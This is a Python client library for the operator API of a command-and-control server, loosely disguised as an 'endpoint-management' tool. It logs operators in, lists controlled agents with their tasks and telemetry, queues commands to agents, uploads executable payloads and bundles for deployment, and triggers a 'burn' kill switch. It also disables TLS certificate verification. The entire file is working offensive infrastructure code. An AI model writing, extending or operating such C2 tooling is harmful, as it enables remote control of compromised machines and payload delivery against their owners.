"""C2ApiClient — wraps the Go endpoint-management-server operator API."""

from __future__ import annotations

import urllib3
import requests

# C2 typically runs behind a self-signed cert — suppress the noise.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_SSL = False  # set to True only if C2 has a trusted cert


def _normalize(addr: str) -> str:
    """Ensure addr has a scheme. Port 443 → https, everything else → http."""
    if addr.startswith(("http://", "https://")):
        return addr.rstrip("/")
    scheme = "https" if addr.endswith(":443") else "http"
    return f"{scheme}://{addr}".rstrip("/")


class C2ApiClient:
    def __init__(self, addr: str, jwt: str) -> None:
        self.base = _normalize(addr)
        self.jwt  = jwt

    @staticmethod
    def login(addr: str, username: str, password: str) -> "C2ApiClient":
        base = _normalize(addr)
        resp = requests.post(
            f"{base}/api/v1/operator/login",
            json={"username": username, "password": password},
            timeout=10,
            verify=_SSL,
        )
        resp.raise_for_status()
        token = resp.json().get("token")
        if not token:
            raise ValueError("login response missing 'token' field")
        return C2ApiClient(base, token)

    def _h(self) -> dict:
        return {"Authorization": f"Bearer {self.jwt}"}

    # ── Agent management ──────────────────────────────────────────────

    def list_agents(self, limit: int = 100) -> list[dict]:
        resp = requests.get(
            f"{self.base}/api/v1/operator/agents",
            headers=self._h(),
            params={"limit": limit},
            timeout=10,
            verify=_SSL,
        )
        resp.raise_for_status()
        return resp.json().get("agents", [])

    def list_tasks(self, agent_id: str, limit: int = 50) -> list[dict]:
        resp = requests.get(
            f"{self.base}/api/v1/operator/tasks",
            headers=self._h(),
            params={"agent_id": agent_id, "limit": limit},
            timeout=10,
            verify=_SSL,
        )
        resp.raise_for_status()
        return resp.json().get("tasks", [])

    def list_telemetry(self, agent_id: str, limit: int = 50) -> list[dict]:
        resp = requests.get(
            f"{self.base}/api/v1/operator/telemetry",
            headers=self._h(),
            params={"agent_id": agent_id, "limit": limit},
            timeout=10,
            verify=_SSL,
        )
        resp.raise_for_status()
        return resp.json().get("telemetry", [])

    def create_task(
        self,
        agent_id: str,
        command_type: str,
        payload: dict | None = None,
    ) -> dict:
        resp = requests.post(
            f"{self.base}/api/v1/agent/{agent_id}/tasks",
            headers=self._h(),
            json={"command_type": command_type, "payload": payload or {}},
            timeout=10,
            verify=_SSL,
        )
        resp.raise_for_status()
        return resp.json()

    # ── Payload / bundle management ───────────────────────────────────

    def upload_payload(self, payload_bytes: bytes, filename: str = "payload.exe") -> dict:
        resp = requests.post(
            f"{self.base}/api/v1/operator/payload/upload",
            headers=self._h(),
            files={"file": (filename, payload_bytes, "application/octet-stream")},
            timeout=60,
            verify=_SSL,
        )
        resp.raise_for_status()
        return resp.json()

    def payload_status(self) -> dict:
        resp = requests.get(
            f"{self.base}/api/v1/operator/payload/status",
            headers=self._h(),
            timeout=10,
            verify=_SSL,
        )
        resp.raise_for_status()
        return resp.json()

    def upload_bundle(self, bundle_bytes: bytes) -> dict:
        resp = requests.post(
            f"{self.base}/api/v1/operator/bundle/upload",
            headers=self._h(),
            files={"bundle": ("bundle.bin", bundle_bytes, "application/octet-stream")},
            timeout=60,
            verify=_SSL,
        )
        resp.raise_for_status()
        return resp.json()

    # ── Kill switch ───────────────────────────────────────────────────

    def burn(self) -> dict:
        resp = requests.post(
            f"{self.base}/api/v1/operator/burn",
            headers=self._h(),
            timeout=30,
            verify=_SSL,
        )
        resp.raise_for_status()
        return resp.json()
